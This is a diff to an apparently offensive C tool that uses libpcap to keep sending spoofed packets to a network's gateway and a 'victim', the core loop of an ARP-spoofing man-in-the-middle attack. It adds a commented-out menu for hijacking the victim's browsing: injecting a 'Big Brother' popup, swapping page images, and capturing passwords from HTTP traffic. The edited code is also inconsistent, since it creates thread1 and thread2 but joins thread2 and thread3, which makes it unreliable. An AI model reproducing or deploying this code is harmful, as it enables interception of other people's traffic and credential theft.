@@ -20,7 +20,7 @@ void *startG(void *arg) {
     while (1) {
         pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
         printf("Packet %d was sent to Gateway\n", ++i);
-        usleep(2e6);
+        sleep(2);
     }
     pthread_exit(NULL);
 }
@@ -31,7 +31,6 @@ void *startV(void *arg) {
     real_arg = (struct arg1 *)arg;
     while (1) {
         pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
-        printf("Packet %d was sent to Victim\n", ++i);
         sleep(1);
     }
     pthread_exit(NULL);
@@ -163,9 +162,25 @@ int main(int argc, char const *argv[]) {
 
     /* Attack */
     printf("Attack!\n");
-    ret_thread2 = pthread_create(&thread2, NULL, (void *)startG, (void *)&gate_arg);
-    ret_thread3 = pthread_create(&thread3, NULL, (void *)startV, (void *)&tar_arg);
+    ret_thread1 = pthread_create(&thread1, NULL, (void *)startG, (void *)&gate_arg);
+    ret_thread2 = pthread_create(&thread2, NULL, (void *)startV, (void *)&tar_arg);
 
+    /* next step */
+    /*printf("Please wait\n");
+    sleep(2);
+    int choose;
+    printf("Now your victim's network has been broken !\n");
+    printf("If you want to do something interesting, you can enter a number to choose mode.\n");
+    printf("\t1: Just \"repair\" his network\n");
+    printf("\t2: Add a window which says \"Big Brother is watching you!\" when he open a web page.\n");
+    printf("\t3: Change all the picture in his web page to HUAJI.\n");
+    printf("\t4: Get his passward in http packet.\n");
+    scanf(" %d", &choose);
+    switch (choose) {
+        case 1: {
+            
+        }
+    }*/
     /* before end */
     pthread_join(thread2,NULL);
     pthread_join(thread3,NULL);
